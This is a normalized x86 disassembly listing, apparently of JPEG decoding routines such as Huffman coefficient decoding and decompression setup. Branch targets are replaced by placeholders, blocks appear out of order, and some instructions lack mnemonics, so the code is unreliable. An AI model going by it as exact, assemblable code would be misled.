mov ecx [ ebx + 0x18 ]
mov [ ebx + 0x6c ] ecx
mov eax [ ebx + 0x1c ]
mov [ ebx + 0x70 ] eax
mov [ ebx + 0x12e ] 0x8
mov eax [ ebx + 0x18 ]
inc eax
sar eax 0x1
jns r-xdata
sar eax 0x2
mov [ ebx + 0x6c ] eax
mov edx [ ebx + 0x1c ]
add edx 0x3
test edx edx
jns r-xdata
add eax 0x3
sar edx 0x3
mov [ ebx + 0x70 ] edx
mov [ ebx + 0x12e ] 0x1
jmp r-xdata
add edx 0x7
cmp esi [ ebx + 0x20 ]
jl r-xdata
mov [ ebx + 0x6c ] eax
mov edx [ ebx + 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
adc eax 0x0
sar edx 0x2
mov [ ebx + 0x70 ] edx
mov [ ebx + 0x12e ] 0x2
jmp r-xdata
add edx 0x3
xor esi esi
mov ecx [ ebx + 0xd4 ]
jmp r-xdata
mov eax [ ebx + 0x12e ]
jmp r-xdata
xor esi esi
mov ecx [ ebx + 0xd4 ]
jmp r-xdata
mov [ ebx + 0x70 ] edx
mov [ ebx + 0x12e ] 0x4
jmp r-xdata
adc edx 0x0
cmp eax 0x8
jge r-xdata
cmp esi [ ebx + 0x20 ]
jl r-xdata
mov [ ecx + 0x24 ] eax
inc esi
add ecx 0x54
mov edx [ ecx + 0x8 ]
imul edx eax
add edx edx
mov edi [ ebx + 0x126 ]
imul edi [ ebx + 0x12e ]
cmp edx edi
jg r-xdata
mov eax [ ecx + 0x8 ]
mov edi [ ebx + 0x126 ]
imul [ ecx + 0x24 ]
imul [ ebx + 0x18 ]
shl edi 0x3
inc esi
add eax edi
dec eax
cdq
idiv edi
mov [ ecx + 0x28 ] eax
mov eax [ ecx + 0xc ]
mov edi [ ebx + 0x12a ]
imul [ ecx + 0x24 ]
imul [ ebx + 0x1c ]
shl edi 0x3
add eax edi
dec eax
cdq
idiv edi
mov [ ecx + 0x2c ] eax
add ecx 0x54
mov eax [ ebx + 0x28 ]
dec eax
je r-xdata
mov edx [ ecx + 0xc ]
imul edx eax
add edx edx
mov edi [ ebx + 0x12a ]
imul edi [ ebx + 0x12e ]
cmp edx edi
jle r-xdata
mov [ ebx + 0x74 ] 0x1
jmp r-xdata
dec eax
sub eax 0x2
jb r-xdata
add eax eax
cmp [ ebx + 0x50 ] 0x0
je r-xdata
mov [ ebx + 0x74 ] 0x3
jmp r-xdata
sub eax 0x2
jb r-xdata
mov eax [ ebx + 0x74 ]
mov eax 0x1
jmp r-xdata
mov [ ebx + 0x74 ] 0x4
jmp r-xdata
jmp r-xdata
mov [ ebx + 0x7c ] 0x1
mov edx [ ebx + 0x12a ]
mov [ ebx + 0x7c ] edx
jmp r-xdata
mov [ ebx + 0x78 ] eax
mov eax ebx
call sub_45b4a8
test eax eax
je r-xdata
mov ecx [ ebx + 0x20 ]
mov [ ebx + 0x74 ] ecx
pop edi
pop esi
pop ebx
retn
sub_45b728
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x580
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov esi eax
add esi 0x100
mov [ ebx + 0x136 ] esi
push 0x100
push 0x0
lea eax [ esi - 0x100 ]
push eax
call sub_46a318
add esp 0xc
xor eax eax
mov edx esi
mov [ edx ] al
inc eax
inc edx
cmp eax 0xff
jle r-xdata
add esi 0x80
mov eax 0x80
lea edx [ esi + 0x80 ]
mov [ edx ] 0xff
inc eax
inc edx
cmp eax 0x200
jl r-xdata
push 0x180
push 0x0
lea ecx [ esi + 0x200 ]
push ecx
call sub_46a318
add esp 0xc
push 0x80
mov eax [ ebx + 0x136 ]
push eax
add esi 0x380
push esi
call sub_46a330
add esp 0xc
pop esi
pop ebx
retn
sub_45b7c4
push ebx
mov ebx eax
push esi
mov eax ebx
mov esi [ ebx + 0x196 ]
call sub_45b538
mov eax ebx
call sub_45b728
mov eax [ ebx + 0x6c ]
imul [ ebx + 0x74 ]
mov edx eax
cmp eax edx
je r-xdata
xor ecx ecx
mov eax ebx
mov [ esi + 0xc ] ecx
call sub_45b4a8
mov [ esi + 0x10 ] eax
xor edx edx
mov [ esi + 0x14 ] edx
xor ecx ecx
mov [ esi + 0x18 ] ecx
cmp [ ebx + 0x50 ] 0x0
je r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x45
mov edx [ eax ]
call [ edx ]
xor eax eax
mov [ ebx + 0x60 ] eax
xor edx edx
mov [ ebx + 0x64 ] edx
xor ecx ecx
mov [ ebx + 0x68 ] ecx
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x50 ] 0x0
je r-xdata
mov eax ebx
call sub_461c08
cmp [ ebx + 0xdc ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x0
je r-xdata
cmp [ ebx + 0x74 ] 0x3
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x2e
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0xd8 ] 0x0
je r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x1
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov eax ebx
call sub_45de04
mov eax ebx
call sub_462168
mov eax ebx
call sub_45d9a4
jmp r-xdata
cmp [ ebx + 0x84 ] 0x0
je r-xdata
mov [ ebx + 0x60 ] 0x1
xor ecx ecx
mov [ ebx + 0x64 ] ecx
xor eax eax
mov [ ebx + 0x68 ] eax
xor edx edx
mov [ ebx + 0x84 ] edx
jmp r-xdata
mov eax ebx
call sub_45d3f8
mov eax ebx
call sub_45c934
jmp r-xdata
mov edx [ ebx + 0x1a6 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov edx [ ebx + 0x68 ]
mov eax ebx
call sub_461904
cmp [ ebx + 0x58 ] 0x0
je r-xdata
mov [ ebx + 0x64 ] 0x1
jmp r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax 0x1
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x68 ] 0x1
jmp r-xdata
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov eax ebx
call sub_45eb94
mov edx [ ebx + 0x1be ]
mov [ esi + 0x14 ] edx
mov eax ebx
mov edx [ eax + 0x4 ]
call [ edx + 0x18 ]
mov eax ebx
mov edx [ eax + 0x1a6 ]
call [ edx + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
call sub_460528
xor eax eax
jmp r-xdata
mov eax ebx
call sub_45fe10
mov edx [ ebx + 0x1be ]
mov [ esi + 0x18 ] edx
cmp [ ebx + 0x64 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
mov edx eax
mov eax ebx
call sub_461590
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x1a6 ]
cmp [ ecx + 0x10 ] 0x0
je r-xdata
cmp [ ebx + 0xd8 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov edx [ ebx + 0x20 ]
lea edx [ edx + edx * 2 ]
add edx 0x2
jmp r-xdata
mov edx [ ebx + 0x8 ]
mov [ edx + 0x10 ] eax
inc [ esi + 0xc ]
dec eax
mov eax [ ebx + 0x8 ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov ecx [ ebx + 0x132 ]
imul ecx edx
mov [ eax + 0x8 ] ecx
xor edx edx
mov [ eax + 0xc ] edx
mov eax 0x3
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
sub_45b9d4
push ebx
mov ebx eax
push esi
mov esi [ ebx + 0x196 ]
cmp [ esi + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x50 ] 0x0
je r-xdata
xor eax eax
xor edx edx
mov [ esi + 0x8 ] eax
mov eax ebx
mov ecx [ eax + 0x1be ]
call [ ecx ]
mov edx 0x2
mov eax ebx
mov ecx [ eax + 0x1a2 ]
call [ ecx ]
mov edx 0x2
mov eax ebx
mov ecx [ eax + 0x19a ]
call [ ecx ]
jmp r-xdata
mov eax ebx
mov edx [ eax + 0x1b2 ]
call [ edx ]
mov eax ebx
mov edx [ eax + 0x19e ]
call [ edx + 0x8 ]
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
cmp [ ebx + 0x84 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ ebx + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov ecx 0x2
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax + 0x1b6 ]
call [ edx ]
cmp [ ebx + 0x50 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax + 0x1ba ]
call [ edx ]
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x68 ] 0x0
je r-xdata
add ecx [ esi + 0xc ]
mov eax [ ebx + 0x8 ]
mov [ eax + 0x10 ] ecx
cmp [ ebx + 0x3c ] 0x0
je r-xdata
dec ecx
cmp [ esi + 0x8 ] 0x0
mov edx 0x3
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax ebx
mov ecx [ eax + 0x1be ]
call [ ecx ]
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x2d
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x14 ]
mov [ ebx + 0x1be ] eax
jmp r-xdata
mov edx [ esi + 0x18 ]
mov [ ebx + 0x1be ] edx
mov [ esi + 0x8 ] 0x1
jmp r-xdata
mov edx [ ebx + 0x1a6 ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
mov eax ebx
mov ecx [ eax + 0x1a2 ]
call [ ecx ]
xor edx edx
mov eax ebx
mov ecx [ eax + 0x19a ]
call [ ecx ]
add edx 0xfffffffd
cmp [ ebx + 0x68 ] 0x0
mov ecx 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
add [ eax + 0x10 ] ecx
dec ecx
sub_45bb38
push ebx
mov ebx eax
push esi
cmp [ ebx + 0x10 ] 0xcf
mov esi [ ebx + 0x196 ]
je r-xdata
cmp [ ebx + 0x50 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x12
mov edx [ ebx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x2d
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x84 ] 0x0
je r-xdata
mov eax ebx
mov ecx [ esi + 0x18 ]
mov [ ebx + 0x1be ] ecx
mov edx [ eax + 0x1be ]
call [ edx + 0xc ]
xor ecx ecx
mov [ esi + 0x8 ] ecx
pop esi
pop ebx
retn
sub_45bba4
push ebx
mov ebx eax
mov eax ebx
push esi
mov ecx 0x1c
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x196 ] eax
mov [ eax ] sub_45b9d4
mov [ eax + 0x4 ] sub_45bb1c
xor edx edx
mov [ eax + 0x8 ] edx
mov eax ebx
call sub_45b7c4
pop esi
pop ebx
retn
sub_45bbdc
push ebx
push esi
mov ebx eax
push edi
push ebp
add esp 0xffffffec
cmp [ ebx + 0x182 ] 0x0
sete al
and eax 0x1
mov ebp [ ebx + 0x1ae ]
mov [ esp ] eax
xor eax eax
cmp [ esp ] 0x0
je r-xdata
mov edx [ ebx + 0x186 ]
cmp edx [ ebx + 0x182 ]
jl r-xdata
cmp [ ebx + 0x186 ] 0x0
je r-xdata
mov eax 0x1
cmp edx 0x40
jl r-xdata
mov edx [ ebx + 0x18a ]
test edx edx
je r-xdata
mov eax 0x1
jmp r-xdata
mov eax 0x1
cmp [ ebx + 0x13a ] 0x1
je r-xdata
cmp [ ebx + 0x18e ] 0xd
jle r-xdata
dec edx
cmp edx [ ebx + 0x18e ]
je r-xdata
test eax eax
je r-xdata
mov eax 0x1
mov eax 0x1
xor eax eax
mov [ esp + 0x4 ] eax
lea ecx [ ebx + 0x13e ]
mov [ esp + 0xc ] ecx
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xe
mov edx [ ebx + 0x182 ]
mov [ eax + 0x18 ] edx
mov ecx [ ebx + 0x186 ]
mov [ eax + 0x1c ] ecx
mov edx [ ebx + 0x18a ]
mov [ eax + 0x20 ] edx
mov ecx [ ebx + 0x18e ]
mov [ eax + 0x24 ] ecx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov edx [ esp + 0x4 ]
cmp edx [ ebx + 0x13a ]
jl r-xdata
mov eax [ esp + 0xc ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
mov [ esp + 0x8 ] ecx
mov esi [ esp + 0x8 ]
shl esi 0x8
add esi [ ebx + 0x9c ]
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x18a ] 0x0
jne r-xdata
mov edi [ ebx + 0x182 ]
lea eax [ esi + edi * 4 ]
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
jge r-xdata
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
cmp edi [ ebx + 0x186 ]
jle r-xdata
mov eax [ ebx ]
xor ecx ecx
mov [ eax + 0x14 ] 0x6f
mov edx [ esp + 0x8 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] ecx
mov eax ebx
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov [ ebp + 0x4 ] sub_45c4f0
mov [ ebp + 0x4 ] sub_45c3d8
jmp r-xdata
mov [ ebp + 0x4 ] sub_45c138
jmp r-xdata
mov [ ebp + 0x4 ] sub_45beec
jmp r-xdata
cmp [ esi ] 0x0
jge r-xdata
inc [ esp + 0x4 ]
add [ esp + 0xc ] 0x4
mov ecx [ esp + 0x4 ]
cmp ecx [ ebx + 0x13a ]
jl r-xdata
xor ecx ecx
lea eax [ ebp + 0x18 ]
mov [ esp + 0x4 ] ecx
mov [ esp + 0x10 ] eax
lea edi [ ebx + 0x13e ]
jmp r-xdata
mov eax [ esi ]
xor eax eax
jmp r-xdata
mov eax [ edi ]
cmp [ esp ] 0x0
je r-xdata
xor eax eax
xor edx edx
mov [ ebp + 0xc ] eax
mov [ ebp + 0x8 ] edx
xor ecx ecx
xor eax eax
mov [ ebp + 0x10 ] ecx
mov [ ebp + 0x14 ] eax
mov edx [ ebx + 0x110 ]
mov [ ebp + 0x28 ] edx
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x18e ]
mov [ esi ] eax
inc edi
add esi 0x4
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x6f
mov edx [ esp + 0x8 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] edi
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
cmp eax [ ebx + 0x18a ]
je r-xdata
mov esi [ eax + 0x18 ]
test esi esi
jl r-xdata
cmp [ ebx + 0x18a ] 0x0
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x31
mov [ eax + 0x18 ] esi
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp esi 0x4
jge r-xdata
mov eax [ esp + 0x10 ]
xor edx edx
mov [ eax ] edx
inc [ esp + 0x4 ]
add [ esp + 0x10 ] 0x4
add edi 0x4
mov esi [ eax + 0x14 ]
test esi esi
jl r-xdata
cmp [ ebx + esi * 4 + 0xc0 ] 0x0
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x31
mov [ eax + 0x18 ] esi
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp esi 0x4
jge r-xdata
lea ecx [ ebp + esi * 4 + 0x2c ]
mov edx [ ebx + esi * 4 + 0xc0 ]
mov eax ebx
call sub_45cac8
mov ecx [ ebp + esi * 4 + 0x2c ]
mov [ ebp + 0x3c ] ecx
cmp [ ebx + esi * 4 + 0xb0 ] 0x0
jne r-xdata
lea ecx [ ebp + esi * 4 + 0x2c ]
mov edx [ ebx + esi * 4 + 0xb0 ]
mov eax ebx
call sub_45cac8
jmp r-xdata
sub_45be80
push ebx
mov ebx eax
push esi
mov esi [ ebx + 0x1ae ]
mov eax [ esi + 0xc ]
test eax eax
jns r-xdata
sar eax 0x3
mov edx [ ebx + 0x1aa ]
add [ edx + 0x5c ] eax
xor ecx ecx
mov [ esi + 0xc ] ecx
mov eax ebx
mov edx [ eax + 0x1aa ]
call [ edx + 0x8 ]
test eax eax
jne r-xdata
add eax 0x7
xor edx edx
lea eax [ esi + 0x18 ]
jmp r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp edx [ ebx + 0x13a ]
jl r-xdata
xor ecx ecx
inc edx
mov [ eax ] ecx
add eax 0x4
xor edx edx
mov [ esi + 0x14 ] edx
xor edx edx
mov eax [ ebx + 0x110 ]
mov [ esi + 0x28 ] eax
mov eax 0x1
mov [ esi + 0x10 ] edx
pop esi
pop ebx
retn
sub_45beec
push ebx
push esi
push edi
push ebp
mov ebp eax
add esp 0xffffffac
mov ebx edx
mov eax [ ebp + 0x1ae ]
mov [ esp ] eax
mov edx [ ebp + 0x18e ]
mov [ esp + 0x4 ] edx
cmp [ ebp + 0x110 ] 0x0
je r-xdata
mov [ esp + 0x38 ] ebp
mov eax [ ebp + 0x14 ]
mov edx [ eax ]
mov [ esp + 0x24 ] edx
mov ecx [ eax + 0x4 ]
mov [ esp + 0x28 ] ecx
mov ecx 0x5
mov eax [ ebp + 0x192 ]
mov [ esp + 0x2c ] eax
mov eax [ esp ]
mov edx [ esp ]
mov esi [ eax + 0xc ]
mov eax [ esp ]
mov edi [ edx + 0x8 ]
add eax 0x10
mov [ esp + 0x3c ] eax
mov edx [ esp ]
push esi
push edi
lea edi [ esp + 0x48 ]
lea esi [ edx + 0x14 ]
lea edx [ ebp + 0x15a ]
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov ecx ebx
mov [ esp + 0x8 ] eax
mov [ esp + 0x20 ] edx
mov [ esp + 0x1c ] ecx
jmp r-xdata
mov ecx [ esp ]
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
mov edx [ ebp + 0x156 ]
cmp edx [ esp + 0x8 ]
jg r-xdata
mov eax ebp
call sub_45be80
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov edx [ eax ]
mov [ esp + 0x10 ] edx
mov ecx [ esp + 0x20 ]
mov eax [ ecx ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
mov eax [ ebp + edx * 4 + 0x13e ]
mov edx [ eax + 0x14 ]
mov ecx [ esp ]
mov eax [ ecx + edx * 4 + 0x2c ]
mov [ esp + 0x14 ] eax
cmp esi 0x8
jge r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ esp + 0x24 ]
mov [ eax ] edx
mov ecx [ esp + 0x28 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp + 0x2c ]
mov [ ebp + 0x192 ] eax
mov edx [ esp ]
mov [ edx + 0x8 ] edi
mov ecx [ esp ]
mov [ ecx + 0xc ] esi
lea esi [ esp + 0x40 ]
mov eax [ esp ]
mov ecx 0x5
lea edi [ eax + 0x14 ]
[ edi ] [ esi ]
mov eax [ esp ]
dec [ eax + 0x28 ]
mov eax 0x1
xor eax eax
jmp r-xdata
lea ecx [ esi - 0x8 ]
mov eax edi
sar eax cl
and eax 0xff
mov edx [ esp + 0x14 ]
mov edx [ edx + eax * 4 + 0xd4 ]
mov [ esp + 0x18 ] edx
test edx edx
je r-xdata
push 0x0
lea eax [ esp + 0x28 ]
mov ecx esi
mov edx edi
call sub_45cce0
test eax eax
jne r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x18 ] 0x9
sub esi [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
xor ebx ebx
mov bl [ ecx + eax + 0x4d4 ]
jmp r-xdata
mov edi [ esp + 0x30 ]
mov esi [ esp + 0x34 ]
cmp esi 0x8
jge r-xdata
xor eax eax
jmp r-xdata
mov edi [ esp + 0x30 ]
mov esi [ esp + 0x34 ]
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
mov [ esp + 0x18 ] 0x1
jmp r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xc ]
add ebx [ esp + eax * 4 + 0x44 ]
mov [ esp + ecx * 4 + 0x44 ] ebx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x10 ]
shl bx cl
mov [ eax ] bx
inc [ esp + 0x8 ]
add [ esp + 0x20 ] 0x4
add [ esp + 0x1c ] 0x4
cmp ebx esi
jle r-xdata
mov eax [ esp + 0x14 ]
mov ecx esi
push eax
mov edx [ esp + 0x1c ]
push edx
mov edx edi
lea eax [ esp + 0x2c ]
call sub_45cdf0
mov ebx eax
test eax eax
jge r-xdata
sub esi ebx
mov ecx esi
mov eax edi
sar eax cl
mov ecx ebx
mov edx 0x1
shl edx cl
dec edx
and eax edx
cmp eax [ ebx * 4 + rw-data ]
jge r-xdata
push ebx
lea eax [ esp + 0x28 ]
mov ecx esi
mov edx edi
call sub_45cce0
test eax eax
jne r-xdata
mov edx eax
mov edx [ ebx * 4 + rw-data ]
add edx eax
jmp r-xdata
mov edi [ esp + 0x30 ]
mov esi [ esp + 0x34 ]
xor eax eax
jmp r-xdata
mov ebx edx
sub_45c138
push ebx
push esi
push edi
push ebp
add esp 0xffffffc4
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1ae ]
mov [ esp + 0x4 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x186 ]
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x18e ]
mov [ esp + 0xc ] ecx
mov eax [ esp ]
cmp [ eax + 0x110 ] 0x0
je r-xdata
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x14 ]
mov [ esp + 0x14 ] ecx
cmp [ esp + 0x14 ] 0x0
jbe r-xdata
mov edx [ esp + 0x4 ]
cmp [ edx + 0x28 ] 0x0
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x34 ] eax
mov edx [ esp ]
mov eax [ edx + 0x14 ]
mov edx [ eax ]
mov [ esp + 0x20 ] edx
mov ecx [ eax + 0x4 ]
mov [ esp + 0x24 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x192 ]
mov [ esp + 0x28 ] edx
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x4 ]
mov ebx [ eax + 0xc ]
mov eax [ esp + 0x4 ]
mov ebp [ ecx + 0x8 ]
add eax 0x10
mov [ esp + 0x38 ] eax
mov edx [ esi ]
mov [ esp + 0x18 ] edx
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x3c ]
mov [ esp + 0x1c ] eax
mov edx [ esp ]
mov ecx [ edx + 0x182 ]
mov [ esp + 0x10 ] ecx
mov eax [ esp + 0x10 ]
cmp eax [ esp + 0x8 ]
jg r-xdata
dec [ esp + 0x14 ]
jmp r-xdata
mov eax [ esp ]
call sub_45be80
test eax eax
jne r-xdata
mov eax [ esp ]
mov eax [ eax + 0x14 ]
mov edx [ esp + 0x20 ]
mov [ eax ] edx
mov ecx [ esp + 0x24 ]
mov [ eax + 0x4 ] ecx
mov eax [ esp ]
mov edx [ esp + 0x28 ]
mov [ eax + 0x192 ] edx
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x8 ] ebp
mov eax [ esp + 0x4 ]
mov [ eax + 0xc ] ebx
cmp ebx 0x8
jge r-xdata
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x14 ]
mov [ edx + 0x14 ] ecx
mov eax [ esp + 0x4 ]
dec [ eax + 0x28 ]
mov eax 0x1
xor eax eax
jmp r-xdata
lea ecx [ ebx - 0x8 ]
mov eax ebp
sar eax cl
and eax 0xff
mov edx [ esp + 0x1c ]
mov esi [ edx + eax * 4 + 0xd4 ]
test esi esi
je r-xdata
push 0x0
lea eax [ esp + 0x24 ]
mov ecx ebx
mov edx ebp
call sub_45cce0
test eax eax
jne r-xdata
add esp 0x3c
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi 0x9
sub ebx esi
mov edx [ esp + 0x1c ]
movzx edi [ edx + eax + 0x4d4 ]
jmp r-xdata
mov ebp [ esp + 0x2c ]
mov ebx [ esp + 0x30 ]
cmp ebx 0x8
jge r-xdata
xor eax eax
jmp r-xdata
mov ebp [ esp + 0x2c ]
mov ebx [ esp + 0x30 ]
xor eax eax
jmp r-xdata
mov esi edi
sar esi 0x4
and edi 0xf
test edi edi
je r-xdata
mov esi 0x1
jmp r-xdata
cmp esi 0xf
jne r-xdata
add [ esp + 0x10 ] esi
cmp edi ebx
jle r-xdata
mov eax [ esp + 0x1c ]
push eax
push esi
lea eax [ esp + 0x28 ]
mov ecx ebx
mov edx ebp
call sub_45cdf0
mov edi eax
test eax eax
jge r-xdata
mov ecx esi
mov edi 0x1
shl edi cl
mov [ esp + 0x14 ] edi
test esi esi
je r-xdata
add [ esp + 0x10 ] 0xf
jmp r-xdata
sub ebx edi
mov ecx ebx
mov esi ebp
sar esi cl
mov ecx edi
mov eax 0x1
shl eax cl
dec eax
and esi eax
cmp esi [ edi * 4 + rw-data ]
jge r-xdata
push edi
lea eax [ esp + 0x24 ]
mov ecx ebx
mov edx ebp
call sub_45cce0
test eax eax
jne r-xdata
dec [ esp + 0x14 ]
jmp r-xdata
cmp esi ebx
jle r-xdata
inc [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
cmp edx [ esp + 0x8 ]
jle r-xdata
mov edx esi
mov edx [ edi * 4 + rw-data ]
add edx esi
jmp r-xdata
mov ebp [ esp + 0x2c ]
mov ebx [ esp + 0x30 ]
xor eax eax
jmp r-xdata
sub ebx esi
mov eax ebp
mov ecx ebx
dec edi
sar eax cl
and eax edi
mov esi eax
add [ esp + 0x14 ] esi
push esi
lea eax [ esp + 0x24 ]
mov ecx ebx
mov edx ebp
call sub_45cce0
test eax eax
jne r-xdata
mov edi edx
mov ecx [ esp + 0xc ]
shl di cl
mov eax [ esp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ esp + 0x18 ]
mov [ edx + eax * 2 ] di
jmp r-xdata
mov ebp [ esp + 0x2c ]
mov ebx [ esp + 0x30 ]
xor eax eax
jmp r-xdata
sub_45c3d8
push ebx
push esi
mov ebx eax
push edi
add esp 0xffffffd4
mov esi edx
mov eax [ ebx + 0x1ae ]
mov edx 0x1
mov [ esp ] eax
mov ecx [ ebx + 0x18e ]
shl edx cl
mov [ esp + 0x4 ] edx
cmp [ ebx + 0x110 ] 0x0
je r-xdata
mov [ esp + 0x24 ] ebx
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
mov [ esp + 0x10 ] edx
mov ecx [ eax + 0x4 ]
mov [ esp + 0x14 ] ecx
mov eax [ ebx + 0x192 ]
mov [ esp + 0x18 ] eax
mov eax [ esp ]
mov edx [ esp ]
mov ecx [ esp ]
add ecx 0x10
mov edx [ edx + 0x8 ]
mov eax [ eax + 0xc ]
mov [ esp + 0x28 ] ecx
xor ecx ecx
mov [ esp + 0x8 ] ecx
mov ecx esi
mov esi ecx
jmp r-xdata
mov eax [ esp ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov ecx [ esp + 0x8 ]
cmp ecx [ ebx + 0x156 ]
jl r-xdata
mov eax ebx
call sub_45be80
test eax eax
jne r-xdata
mov ecx [ esi ]
cmp eax 0x1
mov [ esp + 0xc ] ecx
jge r-xdata
mov ecx [ ebx + 0x14 ]
mov esi [ esp + 0x10 ]
mov [ ecx ] esi
mov esi [ esp + 0x14 ]
mov [ ecx + 0x4 ] esi
mov ecx [ esp + 0x18 ]
mov [ ebx + 0x192 ] ecx
mov ecx [ esp ]
mov [ ecx + 0x8 ] edx
mov edx [ esp ]
mov [ edx + 0xc ] eax
mov eax [ esp ]
dec [ eax + 0x28 ]
mov eax 0x1
xor eax eax
jmp r-xdata
dec eax
mov ecx eax
mov edi edx
sar edi cl
test edi 0x1
je r-xdata
push 0x1
lea ecx [ esp + 0x14 ]
xchg ecx eax
call sub_45cce0
test eax eax
jne r-xdata
add esp 0x2c
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
add esi 0x4
mov ecx [ esp + 0xc ]
mov di [ esp + 0x4 ]
or [ ecx ] di
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x20 ]
xor eax eax
jmp r-xdata
sub_45c4f0
push ebx
push esi
push edi
push ebp
add esp 0xfffffeb0
mov edi edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1ae ]
mov [ esp + 0x4 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x186 ]
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov eax [ edx + 0x18e ]
mov edx 0x1
mov ecx eax
shl edx cl
mov ecx eax
or eax 0xffffffff
shl eax cl
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] eax
mov edx [ esp ]
cmp [ edx + 0x110 ] 0x0
je r-xdata
mov edx [ esp ]
mov [ esp + 0x48 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x14 ]
mov edx [ eax ]
mov [ esp + 0x34 ] edx
mov ecx [ eax + 0x4 ]
mov [ esp + 0x38 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x192 ]
